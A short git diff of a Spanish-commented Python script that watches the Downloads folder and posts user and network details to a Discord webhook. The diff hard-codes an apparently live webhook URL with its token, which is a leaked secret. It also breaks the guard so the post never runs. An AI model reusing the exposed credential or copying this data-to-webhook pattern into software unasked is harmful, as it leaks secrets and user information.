@@ -12,7 +12,7 @@ from cryptography.fernet import Fernet
 import requests
 
 # Webhook de Discord
-WEBHOOK_URL = "URL:dcrd"
+WEBHOOK_URL = " https://discord.com/api/webhooks/1382940581868605542/4seBcamjK5Q80gSh7Hr1iW0-_T2bsQq_cS4_mecd-Z0O81eZZCpIUHYGFbqHuQemd4ZJ"
 
 # --- CONFIGURACIÓN ---
 CARPETA_VIGILADA = os.path.expanduser("~/Downloads")
@@ -130,7 +130,7 @@ def obtener_info_usuario():
         f"Accede a la API Flask en http://{ip_local}:5000 desde otro dispositivo"
     )
     guardar_log(mensaje)
-    if WEBHOOK_URL != "URL:dcrd":
+    if WEBHOOK_URL != " https://discord.com/api/webhooks/1382940581868605542/4seBcamjK5Q80gSh7Hr1iW0-_T2bsQq_cS4_mecd-Z0O81eZZCpIUHYGFbqHuQemd4ZJ":
         try:
             requests.post(WEBHOOK_URL, json={"content": mensaje})
         except:
